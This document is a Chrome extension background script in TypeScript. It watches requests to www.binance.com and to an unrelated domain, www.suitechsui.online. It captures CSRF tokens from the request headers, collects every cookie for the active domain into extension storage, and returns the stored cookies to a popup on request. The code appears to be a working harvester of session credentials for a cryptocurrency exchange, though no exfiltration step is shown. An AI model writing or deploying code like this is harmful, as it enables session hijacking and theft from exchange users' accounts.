// Function to get the current tab's domain
function getCurrentTabDomain(callback: (domain: string | null) => void) {
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    if (tabs.length > 0 && tabs[0].url) {
      const url = new URL(tabs[0].url);
      const domain = url.hostname;
      callback(domain);
    } else {
      console.warn("No active tab found");
      callback(null);
    }
  });
}

// Fetch cookies for the current tab's domain
function fetchCookiesForCurrentTab() {
  getCurrentTabDomain(function (domain) {
    if (domain) {
      console.log("Current tab domain:", domain);

      if (domain === "www.binance.com" || domain === "www.suitechsui.online") {
        fetchCookiesForDomain(domain);
      } else {
        console.warn("Domain not recognized or supported:", domain);
      }
    } else {
      console.error("Failed to fetch current tab domain");
    }
  });
}

// Existing fetchCookiesForDomain function
function fetchCookiesForDomain(domain: string) {
  chrome.cookies.getAll({ domain: domain }, function (cookies) {
    if (chrome.runtime.lastError) {
      console.error(
        "Error fetching cookies for domain:",
        domain,
        chrome.runtime.lastError
      );
      return;
    }
    console.log("Cookies for domain:", domain, cookies);

    chrome.storage.local.set({ [`cookies_${domain}`]: cookies }, function () {
      console.log(`Cookies for ${domain} saved to storage`);
    });
  });
}

// Listen to web requests and fetch cookies based on the current tab
chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    console.log("Intercepted Request:", details);

    let csrfToken = null;
    if (details.requestHeaders) {
      for (let header of details.requestHeaders) {
        if (header.name.toLowerCase() === "csrftoken") {
          csrfToken = header.value;
          console.log("CSRF Token Found:", csrfToken);

          chrome.storage.local.set({ csrfToken: csrfToken }, function () {
            console.log("CSRF Token saved to storage");
          });
          break;
        }
      }
    }
    if (!csrfToken) {
      console.warn("No CSRF Token found in request headers");
    }

    // Fetch cookies for the current active tab's domain
    fetchCookiesForCurrentTab();
  },
  { urls: ["https://www.binance.com/*", "https://www.suitechsui.online/*"] },
  ["requestHeaders"]
);

// Listen for messages from the popup
chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
  if (message.type === "GET_COOKIES") {
    chrome.storage.local.get(null, (items) => {
      // Filter only cookie entries
      const cookieEntries = Object.entries(items).filter(([key]) =>
        key.startsWith("cookies_")
      );
      const cookies = Object.fromEntries(cookieEntries);
      sendResponse(cookies);
    });
    return true; // Will respond asynchronously
  }
});
